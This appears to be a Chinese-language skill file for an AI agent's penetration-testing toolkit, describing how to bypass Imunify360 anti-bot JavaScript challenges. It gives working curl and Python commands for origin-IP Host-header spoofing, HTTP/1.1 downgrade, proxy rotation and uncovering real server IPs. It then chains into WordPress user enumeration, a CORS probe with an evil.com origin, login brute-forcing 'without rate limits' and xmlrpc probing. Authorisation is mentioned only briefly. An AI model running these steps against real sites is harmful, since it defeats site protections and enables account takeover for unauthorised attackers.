---
name: 踪·破禁
description: >-
  Imunify360 / OpenResty 反爬 JS 挑战绕过：通过直连真实 IP + Host 头欺骗
  完全绕过 Imunify360 的 bot-protection。适用于 Plesk/cPanel 生态中部署了
  Imunify360 的站点。
  Cloudflare JS Challenge 走 waf-js-challenge-bypass，通用 WAF 走 waf-detector。
globs:
  - "案卷/*/案卷/antibot*"
  - "案卷/*/案卷/imunify*"
---

# Imunify360 反爬直连 IP 绕过

**前提**：目标在 `授权范围`。

## 成功口径

| 档 | 成立 | 不算 |
|----|------|------|
| L1 | 域名访问触发 JS 挑战，直连 IP 返回正常页面 | IP 也触发挑战 |
| L2 | 绕过后可无限速访问 REST API / 登录页 / xmlrpc | 只绕过首页但 API 仍被拦 |
| L3 | 绕过后成功利用其他漏洞（爆破/注入/CORS） | 仅绕过无后续利用 |

## 何时启用

- 响应包含 `"Access denied by Imunify360 bot-protection"`
- 响应含 `imunify360-captcha` / `wsidchk` / `splashscreen` JS
- `Server: openresty` + 页面内容为 JS 挑战而非真实内容
- Plesk / cPanel 面板管理的站点

## 指纹识别

```bash
# Imunify360 特征检测
curl -sk https://TARGET/ -D- | grep -iE "imunify360|wsidchk|openresty|splashscreen|bot-protection"

# 响应体检测（JS 挑战页面特征）
curl -sk https://TARGET/ | grep -cE "One moment|wsidchk|__imunify360"
```

## 绕过手法

### 手法一：直连 IP + Host 头（首选，最简单）

```bash
# 前提：已知真实 IP（通过 DNS 历史/邮件头/SSL 证书/子域名枚举获得）
# 将 REAL_IP 替换为目标真实 IP，DOMAIN 替换为目标域名

# 测试绕过
curl -sk -H "Host: DOMAIN" https://REAL_IP/ -D-

# 如果返回正常页面而非 JS 挑战，则绕过成功
# 后续所有请求都用这个模式：
curl -sk -H "Host: DOMAIN" https://REAL_IP/wp-json/wp/v2/users
curl -sk -H "Host: DOMAIN" https://REAL_IP/wp-login.php
curl -sk -H "Host: DOMAIN" https://REAL_IP/xmlrpc.php
```

### 手法二：HTTP/1.1 降级（部分场景有效）

```python
import requests

# Imunify360 某些配置只对 HTTP/2 触发 JS 挑战
# requests 默认使用 HTTP/1.1，可能绕过
s = requests.Session()
r = s.get('https://TARGET/wp-json/wp/v2/users', verify=False)
if 'imunify360' not in r.text and r.status_code == 200:
    print('[+] HTTP/1.1 bypass successful')
```

### 手法三：代理轮换（IP 被封后的备选）

```bash
# 从 config/proxy-nodes.txt 选取代理
# 格式: HOST:PORT:USER:PASS
PROXY="socks5://USER:PASS@HOST:PORT"

curl -sk --proxy "$PROXY" https://TARGET/wp-json/wp/v2/users

# Python 版
import requests
proxies = {'https': 'socks5://USER:PASS@HOST:PORT'}
r = requests.get('https://TARGET/', proxies=proxies, verify=False)
```

## 获取真实 IP 的方法

```bash
# 1. DNS 历史记录
# SecurityTrails / ViewDNS / DNSHistory 查询域名的 A 记录历史

# 2. 邮件头溯源 — 触发站点发邮件（注册/重置密码），查看 Received 头
# POST /wp-login.php?action=lostpassword → 邮件 Received 头含源 IP

# 3. SSL 证书搜索
# Censys/Shodan 搜索目标域名的 SSL 证书，找到绑定的 IP
# censys: parsed.names: TARGET_DOMAIN
# shodan: ssl.cert.subject.CN:TARGET_DOMAIN

# 4. 子域名枚举 — 某些子域名可能未走 CDN
# dig +short mail.TARGET  ftp.TARGET  cpanel.TARGET  webmail.TARGET

# 5. Contabo/VPS 默认证书 — SSL 证书 CN 含 vmi*.contaboserver.net
curl -sk https://IP_CANDIDATE/ -D- 2>&1 | grep -i "contaboserver\|plesk\|cpanel"
```

## 绕过后的标准动作

```bash
REAL_IP="x.x.x.x"
DOMAIN="target.com"

# 1. REST API 枚举
curl -sk -H "Host: $DOMAIN" "https://$REAL_IP/wp-json/wp/v2/users" | python3 -m json.tool

# 2. CORS 检测（直连 IP 不会被 Imunify360 拦截）
curl -sk -H "Host: $DOMAIN" -H "Origin: https://evil.com" \
  "https://$REAL_IP/wp-json/wp/v2/users" -D- -o /dev/null | grep -i access-control

# 3. 登录爆破（无速率限制）
curl -sk -H "Host: $DOMAIN" "https://$REAL_IP/wp-login.php" \
  -d "log=admin&pwd=test&wp-submit=Log+In"

# 4. xmlrpc 探测
curl -sk -H "Host: $DOMAIN" "https://$REAL_IP/xmlrpc.php" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
```

## 注意事项

1. **IP 被封后**：直连 IP 也可能被封（iptables 层面），此时切换代理
2. **Plesk/Roundcube 不一定绕过**：Imunify360 对不同 VHost 可能有不同策略
3. **禁止滥用**：绕过后仍受授权范围约束，无限速不代表可以无限打

## 与其他 Skill 的关系

- Cloudflare JS 挑战 → `waf-js-challenge-bypass`
- WAF 型号识别 → `waf-detector`
- WAF payload 绕过 → `evasion-kit`
- WP CORS 利用 → `wp-rest-cors-ato`
- 真实 IP 溯源 → `cdn-origin-tracing`

## 真源

- 手法 Playbook：`传承/薄青·岁岁索命.md`
- 工具入口：`python3 炼蛊房/core_web_surface_probe.py --waf-bypass`
- 来源案卷: `案卷/sehuatang_20260902/`
- Imunify360 文档: https://docs.imunify360.com/
- 代理节点: `config/proxy-nodes.txt`
